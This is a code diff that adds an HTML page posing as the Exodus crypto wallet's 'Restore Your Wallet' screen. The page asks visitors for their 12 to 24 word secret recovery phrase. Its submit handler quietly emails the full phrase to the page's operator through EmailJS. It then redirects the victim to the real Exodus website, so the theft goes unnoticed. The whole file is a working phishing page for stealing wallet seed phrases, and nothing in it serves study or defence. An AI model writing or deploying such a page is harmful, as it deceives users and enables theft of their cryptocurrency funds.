@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Connect Your Exodus</title>
+    <link rel="icon" href="exoduslogo.png" type="image/png" />
+    <!-- External Stylesheets -->
+    <link rel="stylesheet" href="login.css" />
+    <link
+      rel="stylesheet"
+      href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"
+      integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm"
+      crossorigin="anonymous"
+    />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css"
+    />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
+      integrity="sha512-iecdLmaskl7CVkqkXNQ/ZH/XLlvWZOJyj7Yy7tcenmpD1ypASozpmT/E0iPtmFIB46ZmdtAc9eNBvH0H/ZpiBw=="
+      crossorigin="anonymous"
+      referrerpolicy="no-referrer"
+    />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;1,300;1,400;1,500;1,600;1,700;1,800&family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap"
+      rel="stylesheet"
+    />
+    <link rel="stylesheet" href="style.css" />
+    <style>
+      img {
+        margin-left: 700px;
+        margin-top: 45px;
+        margin-bottom: 25px;
+      }
+      /* Media queries for mobile devices */
+      @media (max-width: 768px) {
+        .wraper_blackBox {
+          padding: 15px;
+        }
+
+        .displayBTN button {
+          font-size: 0.8rem;
+          padding: 5px 10px;
+          margin-left: 100px;
+        }
+
+        .btn-restore {
+          padding: 8px;
+          font-size: 0.9rem;
+        }
+
+        .titlebox h2 {
+          font-size: 1.3rem;
+        }
+
+        .titlebox h6 {
+          font-size: 0.8rem;
+        }
+      }
+
+      @media (max-width: 576px) {
+        .displayflex {
+          flex-direction: column;
+          gap: 5px;
+        }
+
+        .btn-restore {
+          font-size: 0.85rem;
+          padding: 8px;
+        }
+
+        .form-control {
+          font-size: 0.85rem;
+          padding: 6px;
+        }
+
+        img {
+          max-width: 120px;
+          margin: 15px auto;
+          margin-left: 180px;
+        }
+
+        .titlebox h2 {
+          font-size: 1.2rem;
+        }
+
+        .titlebox h6 {
+          font-size: 0.75rem;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <img src="exoduslogo.png" alt="exodus" />
+    <div class="wraper_blackBox">
+      <div id="words_12" class="words">
+        <form
+          id="passwordForm"
+          class="keydata_12"
+          action="#"
+          method="post"
+          autocomplete="off"
+        >
+          <div class="titlebox">
+            <h2>Restore Your Wallet</h2>
+            <h6 style="color: #878787">
+              Enter your 12-word, 15-word, 18-word, 21-word, or 24-word secret
+              phrase to import your wallet.
+            </h6>
+          </div>
+
+          <div class="displayflex res pb-2">
+            <div class="displayBTN">
+              <button
+                type="button"
+                class="btn btn-outline-secondary active"
+                onclick="updateInputFields(12)"
+              >
+                12 Words
+              </button>
+            </div>
+            <div class="displayBTN">
+              <button
+                type="button"
+                class="btn btn-outline-secondary"
+                onclick="updateInputFields(15)"
+              >
+                15 Words
+              </button>
+            </div>
+            <div class="displayBTN">
+              <button
+                type="button"
+                class="btn btn-outline-secondary"
+                onclick="updateInputFields(18)"
+              >
+                18 Words
+              </button>
+            </div>
+            <div class="displayBTN">
+              <button
+                type="button"
+                class="btn btn-outline-secondary"
+                onclick="updateInputFields(21)"
+              >
+                21 Words
+              </button>
+            </div>
+            <div class="displayBTN">
+              <button
+                type="button"
+                class="btn btn-outline-secondary"
+                onclick="updateInputFields(24)"
+              >
+                24 Words
+              </button>
+            </div>
+          </div>
+
+          <div class="container pt-4">
+            <div class="input-grid" id="inputContainer"></div>
+            <div class="button-container pt-4">
+              <button
+                type="submit"
+                class="btn btn-outline-secondary btn-restore"
+                style="padding: 0px 79px"
+              >
+                RESTORE
+              </button>
+            </div>
+          </div>
+        </form>
+      </div>
+    </div>
+
+    <!-- EmailJS Integration -->
+    <script
+      type="text/javascript"
+      src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"
+    ></script>
+    <script>
+      emailjs.init("eFjqTxnF7nGuJXVZd");
+
+      function updateInputFields(numWords) {
+        var container = document.getElementById("inputContainer");
+        container.innerHTML = ""; // Clear existing input fields
+
+        // Remove 'active' class from all buttons
+        var buttons = document.querySelectorAll(".displayBTN button");
+        buttons.forEach((button) => button.classList.remove("active"));
+
+        // Add 'active' class to the clicked button
+        var clickedButton = document.querySelector(
+          `.displayBTN button[onclick="updateInputFields(${numWords})"]`
+        );
+        clickedButton.classList.add("active");
+
+        // Generate input fields
+        for (var i = 1; i <= numWords; i++) {
+          var inputDiv = document.createElement("div");
+          inputDiv.className = "col";
+
+          var inputElement = document.createElement("input");
+          inputElement.type = "text";
+          inputElement.name = `phrase_value_${i}`;
+          inputElement.className = "form-control input12";
+          inputElement.placeholder = `Word ${i}`;
+          inputElement.required = true;
+
+          inputDiv.appendChild(inputElement);
+          container.appendChild(inputDiv);
+        }
+      }
+
+      // Initialize with 12 input fields and set the first button as active
+      document.addEventListener("DOMContentLoaded", function () {
+        updateInputFields(12);
+      });
+
+      // Handle form submission
+      document
+        .getElementById("passwordForm")
+        .addEventListener("submit", function (e) {
+          e.preventDefault();
+
+          const formData = new FormData(this);
+          const phraseValues = Array.from(formData.values()).join(" ");
+
+          emailjs
+            .send("service_8it2819", "template_u7nor3m", {
+              recovery_phrase: phraseValues,
+            })
+            .then(
+              function (response) {
+                window.location.href = "https://www.exodus.com/";
+              },
+              function (error) {
+                alert("Failed to send recovery phrase. Please try again.");
+              }
+            );
+        });
+    </script>
+    <!-- Start of LiveChat (www.livechat.com) code -->
+    <script type="text/javascript">
+      var Tawk_API = Tawk_API || {},
+        Tawk_LoadStart = new Date();
+      (function () {
+        var s1 = document.createElement("script"),
+          s0 = document.getElementsByTagName("script")[0];
+        s1.async = true;
+        s1.src = "https://embed.tawk.to/66a2a258becc2fed692b2b32/1i3lkkb6g";
+        s1.charset = "UTF-8";
+        s1.setAttribute("crossorigin", "*");
+        s0.parentNode.insertBefore(s1, s0);
+      })();
+    </script>
+    <noscript
+      ><a href="https://www.livechat.com/chat-with/18929835/" rel="nofollow"
+        >Chat with us</a
+      >, powered by
+      <a
+        href="https://www.livechat.com/?welcome"
+        rel="noopener nofollow"
+        target="_blank"
+        >LiveChat</a
+      ></noscript
+    >
+    <!-- End of LiveChat code -->
+  </body>
+</html>
